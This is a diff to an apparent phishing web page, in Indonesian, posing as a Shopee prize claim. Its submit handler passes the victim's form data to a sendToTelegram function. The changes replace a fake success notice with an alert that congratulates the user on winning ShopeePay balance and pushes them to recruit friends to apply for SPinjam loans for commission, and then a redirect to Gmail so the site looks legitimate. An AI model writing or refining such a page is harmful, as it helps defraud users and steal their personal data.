@@ -140,7 +140,6 @@
             e.preventDefault(); // Mencegah submit form default
 
             const form = e.target;
-            const statusMessage = document.getElementById('statusMessage');
             const submitBtn = document.getElementById('submitBtn');
 
             // Kumpulkan data formulir
@@ -155,7 +154,6 @@
             // Nonaktifkan tombol dan tampilkan loading
             submitBtn.disabled = true;
             submitBtn.textContent = 'Memproses Klaim...';
-            statusMessage.classList.add('hidden');
 
             // --- Format Pesan Telegram ---
             const message = `
@@ -170,21 +168,16 @@
             // KIRIM DATA KE TELEGRAM
             sendToTelegram(message); 
 
-            // Simulasi proses klaim 2 detik
-            setTimeout(() => {
-                // Tampilkan pesan sukses
-                statusMessage.textContent = '✅ Klaim berhasil diajukan! Harap tunggu konfirmasi lebih lanjut melalui email atau notifikasi Shopee Anda.';
-                statusMessage.classList.remove('hidden');
-                statusMessage.classList.remove('bg-red-100', 'text-red-700');
-                statusMessage.classList.add('bg-green-100', 'text-green-700');
-                
-                // Aktifkan kembali tombol (opsional)
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Klaim Hadiah Sekarang!';
+            // 1. Munculkan Alert sesuai permintaan
+            alert("Selamat anda telah berhasil mengajukan, Misi dapat hadiah saldo Shopee pay, manfaatkan juga fitur ajak teman untuk ajukan spinjam dan dapatkan juga hadiah komisi dari hasil ajak teman");
 
-                // Alihkan ke halaman berikutnya setelah sukses
-                // window.location.href = "halaman_sukses.html";
-            }, 2000);
+            // 2. Loading 3 detik (3000ms) dan 3. Redirect
+            // Setelah alert ditutup oleh pengguna, delay 3 detik dimulai.
+            setTimeout(() => {
+                // Alihkan ke halaman Gmail (Inbox) setelah delay 3 detik
+                // Menggunakan URL webmail Gmail yang paling relevan untuk inbox
+                window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+            }, 3000); 
         });
     </script>
 </body>
